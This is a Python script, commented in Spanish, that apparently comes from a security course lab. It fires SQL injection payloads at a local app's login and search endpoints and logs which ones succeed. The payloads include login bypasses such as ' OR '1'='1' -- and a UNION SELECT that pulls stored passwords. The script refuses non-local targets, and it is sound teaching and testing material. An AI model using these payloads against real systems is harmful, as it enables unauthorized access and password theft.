"""
ataque_sql_i.py
Script de pruebas de SQL Injection CONTROLADO para la practica.
Envia payloads al login y al buscador y registra si el ataque tuvo exito.

Uso:
    python ataque_sql_i.py                          # contra http://127.0.0.1:5000
    python ataque_sql_i.py --url http://127.0.0.1:5001

Por seguridad, SOLO permite objetivos locales (127.0.0.1 / localhost).
"""
import argparse
import csv
import sys
from urllib.parse import urlparse

import requests

# Claves reales de la BD de laboratorio: si aparecen en una respuesta, hubo filtracion
SECRETOS = ["Admin#2026", "maria123", "juan456"]

PAYLOADS_LOGIN = [
    ("Login normal (referencia)", "maria", "maria123"),
    ("Clave incorrecta (referencia)", "maria", "incorrecta"),
    ("Bypass con OR siempre verdadero", "' OR '1'='1' --", "x"),
    ("Bypass comentando la clave", "admin' --", "x"),
    ("Bypass OR en ambos campos", "x' OR '1'='1", "x' OR '1'='1"),
    ("Error SQL (comilla simple)", "'", "x"),
]

PAYLOADS_BUSCAR = [
    ("Busqueda normal (referencia)", "maria"),
    ("Listar todo con OR", "' OR '1'='1"),
    ("UNION: extraer claves", "' UNION SELECT id, usuario, clave FROM usuarios --"),
    ("Error SQL (comilla simple)", "'"),
]


def solo_local(url):
    host = urlparse(url).hostname
    if host not in ("127.0.0.1", "localhost"):
        sys.exit("Por seguridad este script solo ataca la app de laboratorio local (127.0.0.1).")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", default="http://127.0.0.1:5000")
    a = ap.parse_args()
    solo_local(a.url)
    base = a.url.rstrip("/")
    puerto = urlparse(base).port
    filas = []

    print(f"\n=== Pruebas contra {base} ===\n")
    for nombre, u, c in PAYLOADS_LOGIN:
        r = requests.post(base + "/login", data={"usuario": u, "clave": c}, timeout=10)
        if "Bienvenido" in r.text and not nombre.startswith("Login normal"):
            res = "VULNERABLE: acceso obtenido sin credenciales"
        elif "Bienvenido" in r.text:
            res = "Acceso legitimo"
        elif "Error SQL" in r.text:
            res = "VULNERABLE: error SQL expuesto"
        else:
            res = "BLOQUEADO / rechazado"
        filas.append(["/login", nombre, f"usuario={u} clave={c}", r.status_code, res])

    for nombre, q in PAYLOADS_BUSCAR:
        r = requests.get(base + "/buscar", params={"q": q}, timeout=10)
        filtrado = any(s in r.text for s in SECRETOS)
        if filtrado:
            res = "VULNERABLE: claves filtradas"
        elif "Error SQL" in r.text:
            res = "VULNERABLE: error SQL expuesto"
        elif nombre.startswith("Listar") and r.text.count("<li>") >= 3:
            res = "VULNERABLE: listado completo de usuarios"
        elif nombre.startswith("Busqueda normal"):
            res = "Respuesta legitima"
        else:
            res = "BLOQUEADO / sin filtracion"
        filas.append(["/buscar", nombre, f"q={q}", r.status_code, res])

    print(f"{'Endpoint':9} {'HTTP':5} {'Prueba':36} Resultado")
    print("-" * 100)
    for e, n, p, s, res in filas:
        print(f"{e:9} {s:<5} {n:36} {res}")

    archivo = f"resultados_{puerto}.csv"
    with open(archivo, "w", newline="", encoding="utf-8") as f:
        w = csv.writer(f)
        w.writerow(["Endpoint", "Prueba", "Payload", "HTTP", "Resultado"])
        w.writerows(filas)
    print(f"\nResultados guardados en {archivo}")


if __name__ == "__main__":
    main()
